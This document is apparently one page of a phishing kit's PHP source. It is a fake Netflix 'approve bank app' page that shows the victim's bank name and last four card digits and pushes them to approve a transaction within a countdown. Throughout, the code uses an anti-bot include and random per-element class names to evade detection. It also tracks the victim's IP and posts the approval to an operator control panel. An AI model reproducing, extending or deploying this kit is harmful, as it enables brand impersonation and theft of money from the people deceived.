<?php
    error_reporting(0);
    session_start();
    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    require_once "../setting/lang.php";
    // Lang Fucntion :
    lang();

    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page Approve App Bank";
    get_page_info($get_name_page, $get_name_file);
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/global-rules.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Netflix - <?php echo get_text('title_head_8'); ?></title>
</head>
<body id="body">

    <!-- Navigation -->
    <nav>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-nav">
                <img src="../img/logo.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-sign-out show-message-explain"><?php echo get_text('logout'); ?></span>
            </div>
        </div>
    </nav>
    <!-- Navigation -->

    <!-- Start Main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> main">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-main">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> approve-app">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-approve-app">
                        <img src="../img/logo.png" alt="">
                        <?php echo $_SESSION["image_by"]; ?>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> after-header-approve-app">
                        <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> title"><?php echo get_text('title_head_8'); ?></h1>
                        <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> p-explain"><?php echo get_text('p_explain_step_8'); ?></p>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-and-counter">
                        <div id="countdown" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> timer">06:00</div>           
                        <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> p-explain">
                            <?php echo get_text('p_explain_step_9'); ?>                            
                        </p>   
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> details-approve-app">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-key-and-value"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> key"><?php echo get_text('label_approve_1'); ?></span> <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value">Netflix</span></div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-key-and-value"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> key"><?php echo get_text('label_approve_2'); ?></span><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value"><?php echo date('l jS \of  h:i A'); ?></span></div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-key-and-value"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> key"><?php echo get_text('label_approve_3'); ?></span><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value"><?php if(isset($_SESSION["name_the_bank"])) {echo $_SESSION["name_the_bank"];} else { echo "Bank";}?> </span></div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-key-and-value" style="border-bottom: 0px !important;"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> key"><?php echo get_text('label_approve_4'); ?></span> <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value"><?php echo "XXXX-XXXX-XXXX-" . $_SESSION["Last_four_digits"]; ?></span></div>
                    </div>
                    <form action="../control-panel/check-action.php" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> form-accept-app" method="post" >
                        <input type="hidden" name="step" value="accept-app"> 
                        <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-image-accept">
                            <img src="../img/accept-image.png" alt="">
                        </div>
                        <p>
                            <?php echo get_text('p_explain_step_10'); ?>
                        </p>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-button">
                            <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-send-data" type="submit" name="send_data_9" id="buttonSendData"><?php echo get_text('button_approve'); ?></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <!-- Start Main -->

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> footer">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-footer">
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain"><?php echo get_text('title_footer'); ?></h1>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-footer">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_1'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_2'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_3'); ?></span>
                    </div>

                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_4'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_5'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_6'); ?></span>
                    </div>
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> box-lang">
                  <img src="../img/icon-lang-2.png" alt="">
                    <select>
                        <option value=""><?php echo get_text('lang_footer'); ?></option>
                    </select>
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> svg-select-lang" width="16" height="16" viewBox="0 0 16 16" role="img" data-icon="CaretDownSmall" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path></svg>
                </div>
            </div>
        </div>
    </div>

    <!-- Message Explain -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-user" id="messageUser">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-message-user">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-messsage-user">
                <img src="../img/logo.png" alt="">
                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-header" id="closeMessageuser1" type="button"><i
                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark"></i></button>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-message-user">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alert-icon">
                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-shield-halved"></i>
                </span>
                <h2><?php echo get_text('title_message_user'); ?></h2>
                <p>
                    <?php echo get_text('text_message_user'); ?>
                </p>
                <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-user" id="closeMessageuser2"><?php echo get_text('button_message_user'); ?></button>
            </div>
        </div>
    </div>
    <!-- Message Explain -->

    <!-- JS -->
    <script src="../js/main.js"></script>
    <script src="../js/script-counter.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?>
</body>
</html>
